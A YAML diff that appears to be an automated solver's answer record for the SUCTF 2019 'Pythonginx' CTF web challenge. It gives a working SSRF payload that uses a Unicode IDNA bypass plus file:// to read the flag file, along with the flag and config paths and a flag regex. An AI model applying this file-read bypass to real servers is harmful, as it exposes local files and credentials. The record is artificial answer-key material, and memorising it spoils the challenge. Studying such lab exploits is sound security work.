@@ -1,0 +1,27 @@
+name: '[SUCTF 2019]Pythonginx'
+category: web
+keywords:
+- suctf
+- pythonginx
+- github
+- team
+- blob
+- master
+- web
+steps:
+- '[claude] The SSRF vulnerability is exploited using IDNA encoding bypass with Unicode
+  characters ⓢⓤⓒⓣⓕ.cc that encode to suctf.cc, combined with file:// protocol to read
+  local files'
+- '[claude] The flag file location is /usr/fffffflag as revealed in the nginx configuration
+  at /usr/local/nginx/conf/nginx.conf'
+- '[claude] The exploit payload is: http://27d3254bf838b3bd2731ecfd.http-ctf2.dasctf.com:80/getUrl?url=file://ⓢⓤⓒⓣⓕ.cc/usr/fffffflag'
+- '[claude] VERIFIED_FACT=The exploit payload is: http://27d3254bf838b3bd2731ecfd.http-ctf2.dasctf.com:80/getUrl?url=file://ⓢⓤⓒⓣⓕ.cc/usr/fffffflag'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[claude] The SSRF vulnerability is exploited using IDNA encoding bypass with Unicode
+  characters ⓢⓤⓒⓣⓕ.cc that encode to suctf.cc, combined with file:// protocol to read
+  local files'
+- '[claude] VERIFIED_FACT=The exploit payload is: http://27d3254bf838b3bd2731ecfd.http-ctf2.dasctf.com:80/getUrl?url=file://ⓢⓤⓒⓣⓕ.cc/usr/fffffflag'
+success_format: CTF2\{[^}]+\}
+source: a64337f8-f0a1-45ab-9104-64ea89ec26f4 (solver 7a99eaf4-78ee-4f97-ad2b-a12254b9ba4e)
+notes: ''
